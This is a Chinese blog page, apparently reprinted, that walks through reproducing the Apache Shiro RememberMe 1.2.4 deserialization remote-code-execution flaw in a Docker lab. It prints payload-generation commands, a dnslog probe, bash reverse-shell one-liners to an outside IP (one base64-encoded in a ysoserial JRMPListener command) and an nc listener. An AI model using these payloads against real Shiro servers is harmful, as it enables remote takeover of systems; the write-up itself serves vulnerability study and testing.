@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Shiro RememberMe 1.2.4 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker 本文转自莫憨憨  影响版本：Apache Shiro &lt;&#x3D; 1.2.4漏洞产生原因: shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro RememberMe 1.2.4">
+<meta property="og:url" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker 本文转自莫憨憨  影响版本：Apache Shiro &lt;&#x3D; 1.2.4漏洞产生原因: shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/1.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/2.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/3.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/4.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/5.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/6.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/7.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/8.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/9.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/10.png">
+<meta property="og:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/11.png">
+<meta property="article:published_time" content="2022-08-08T14:40:25.000Z">
+<meta property="article:modified_time" content="2023-09-01T15:50:00.104Z">
+<meta property="article:author" content="Szczecin">
+<meta property="article:tag" content="Reprint">
+<meta property="article:tag" content="Exploit">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Apache">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/08/Shiro-RememberMe-1-2-4/1.png">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        <article id="post-Shiro-RememberMe-1-2-4"
+         class="post article white-box article-type-post"
+         itemscope itemprop="blogPost">
+    <h2 class="title">
+        <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
+            Shiro RememberMe 1.2.4
+        </a>
+    </h2>
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <div class="article-entry" itemprop="articleBody">
+            <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
+</blockquote>
+<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
+<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
+</blockquote>
+<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如需进入环境，命令为</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3><span id="3web访问">3.web访问</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
+<p>或虚拟机外面用真实ip访问</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
+<p>至此漏洞环境搭建成功</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
+<p>查看返回包里setcookie有rememberme的字样</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
+<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
+</blockquote>
+<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
+<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
+</blockquote>
+<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
+<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>运行结果如下图：</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
+<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
+</blockquote>
+<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
+<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
+</blockquote>
+<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
+<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
+<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
+</blockquote>
+<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
+<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PS：ip假的，不打码，观看流畅</p>
+</blockquote>
+<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
+<p>这里使用curl也能达到burp的效果</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
+</blockquote>
+<h2><span id="题外话1">题外话1</span></h2><blockquote>
+<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
+</blockquote>
+<h2><span id="题外话2">题外话2</span></h2><blockquote>
+<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考链接">参考链接：</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
+</blockquote>
+
+        </div>
+        <div class="article-tags tags">
+            
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shiro/" rel="tag">Shiro</a>
+            
+        </div>
+    </section>
+</article>
+
+
+
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
